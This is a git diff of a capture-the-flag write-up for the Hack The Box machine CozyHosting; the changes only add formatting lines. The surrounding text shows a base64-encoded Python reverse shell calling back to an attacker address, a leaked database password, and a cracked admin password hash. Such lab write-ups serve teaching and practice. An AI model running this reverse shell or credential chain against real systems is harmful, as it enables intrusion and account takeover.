@@ -27,6 +27,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://cozyhosting.htb
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+{: .nolineno}
 
 ## Web Enumeration ⤵️
 
@@ -111,6 +112,7 @@ by Ben "epi" Risher 🤓                 ver: 2.10.0
 ┌──(kali㉿kali)-[~/Downloads/HTB/CozyHosting]
 └─$
 ```
+{: .nolineno}
 
 And I got these any files so lets dig in →
 
@@ -149,6 +151,7 @@ Now lets insert our payload here →
 └─$ echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjYxIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw' |base64 -d 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ```
+{: .nolineno}
 
 Now when I executed it I got the response as reverse shell on nc lisener →
 
@@ -162,6 +165,7 @@ ls
 cloudhosting-0.0.1.jar
 app@cozyhosting:/app$
 ```
+{: .nolineno}
 
 I downloaded this file and extracted that file and I got this credentials ⤵️ 
 
@@ -181,6 +185,7 @@ spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
 spring.datasource.username=postgres
 spring.datasource.password=Vg&nvzAQ7XxR
 ```
+{: .nolineno}
 
 Lets access the postgresql now →
 
@@ -243,12 +248,14 @@ name    |                           password                           | role
 (2 rows)
 
 ```
+{: .nolineno}
 
 Now with hashcat Tool I cracked the password of admin that is ⤵️ 
 
 ```bash
 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
 ```
+{: .nolineno}
 
 Now its time for SSH login →
 
@@ -293,6 +300,7 @@ To check for new updates run: sudo apt update
 Last login: Tue Aug 29 09:03:34 2023 from 10.10.14.41
 josh@cozyhosting:~$
 ```
+{: .nolineno}
 
 Now lets see how this user can lead me to root user →
 
@@ -306,6 +314,7 @@ User josh may run the following commands on localhost:
     (root) /usr/bin/ssh *
 josh@cozyhosting:~$
 ```
+{: .nolineno}
 
 Now with GTFObin help I can exploit this one →
 
